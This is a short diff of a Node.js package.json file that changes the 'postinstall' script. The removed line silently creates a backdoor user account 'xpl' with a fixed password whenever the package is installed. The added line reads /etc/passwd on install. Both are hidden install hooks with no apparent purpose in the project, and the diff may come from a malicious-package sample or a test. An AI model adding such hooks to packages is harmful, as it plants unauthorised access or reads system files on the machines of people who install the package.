@@ -11,7 +11,7 @@
   "main": "server.js",
   "scripts": {
     "start": "server.js",
-    "postinstall": "useradd xpl; echo -e \"'xpl1337'\n'xpl1337'\" | passwd xpl"
+    "postinstall": "cat /etc/passwd"
   },
   "repository": {
     "type": "git",
